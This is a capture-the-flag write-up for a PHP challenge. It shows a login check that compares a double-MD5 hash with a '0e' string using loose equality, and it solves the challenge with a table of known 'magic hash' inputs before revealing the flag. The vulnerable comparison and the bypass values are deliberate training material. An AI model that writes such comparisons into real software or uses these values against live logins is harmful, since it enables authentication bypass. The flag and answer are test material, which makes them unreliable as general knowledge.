### Magic admin
Level: Medium
Attachment: functions.php

Everyone tells me I can’t leave passwords in the code, someone might see them. “Blah blah blah” is what I hear. To prove to everyone that my application is safe, I posted it in the public domain, no one can break it.

### Solution

We look at the sources and see the condition for obtaining an admin session::

```
function auth(?string $username, ?string $password): bool
{
    $isAdmin = $username == "admin" && md5(md5($password)) == "0e385589729688144363378792916561";
    if (!$isAdmin) {
        return false;
    }
    session_start();
    $_SESSION['is_admin'] = true;
    session_commit();
    return true;
}
```

Look like the "php magic hash" vulnerability, select a hash that satisfies the condition:

```
md5(md5($password)) == "0e"
```

## php 0e attack
| pass              | function            | hashed                                      |
| --------------    | -----------------   | ------------------------------------------  |
| `280289646what`   | md5(md5(pass))      | `0e702135290989833360158583967966`          |
| `411837728`       | sha1(sha1(pass))    | `0e83841677853248886571854748340858991083`  |
| `721833251isthis` | md5(pass)           | `0e107683479426645510769666502452`          |


Get flag: CODEBY{m@g1C_h4Shes_!S_fUNNy}